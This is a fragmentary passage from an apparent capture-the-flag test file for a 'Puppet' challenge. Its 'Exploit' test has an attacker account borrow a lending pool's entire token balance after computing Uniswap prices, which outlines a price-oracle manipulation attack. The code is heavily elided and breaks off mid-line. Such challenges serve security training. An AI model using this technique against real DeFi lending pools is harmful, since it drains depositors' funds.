...
describe("[Challenge] Puppet", function () {
  ...
  it("Exploit", async function () {
    ...
    const minEth = calculateTokenToEthInputPrice(
    ...
    const depositAmount = await this.lendingPool.calculateDepositRequired(
      POOL_INITIAL_TOKEN_BALANCE
    );

    await this.lendingPool
      .connect(attacker)
      .borrow(POOL_INITIAL_TOKEN_BALANCE, { value: depositAmount });
    let price = await this.uniswapExchange.getEthToTokenOutputPrice(
